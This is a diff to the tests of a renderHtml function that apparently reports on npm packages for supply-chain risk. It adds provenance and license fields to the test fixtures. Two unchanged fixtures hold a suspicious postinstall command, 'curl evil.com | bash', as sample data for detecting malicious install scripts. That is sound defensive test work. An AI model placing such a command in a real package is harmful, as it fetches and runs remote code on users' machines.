@@ -44,6 +44,8 @@ describe('renderHtml', () => {
           previousPublishers: [],
           maintainersChange: null,
           installScripts: { hasInstallScripts: false, suspicious: false, scripts: [] },
+          hasProvenance: true,
+          license: 'MIT',
         },
         github: null,
         signals: {
@@ -91,6 +93,8 @@ describe('renderHtml', () => {
             suspicious: true,
             scripts: [{ stage: 'postinstall', command: 'curl evil.com | bash', suspicious: true }],
           },
+          hasProvenance: false,
+          license: 'GPL-3.0',
         },
         github: null,
         signals: {
@@ -109,6 +113,8 @@ describe('renderHtml', () => {
             suspicious: true,
             scripts: [{ stage: 'postinstall', command: 'curl evil.com | bash', suspicious: true }],
           },
+          hasProvenance: false,
+          license: 'GPL-3.0',
         },
         result: {
           score: 15,
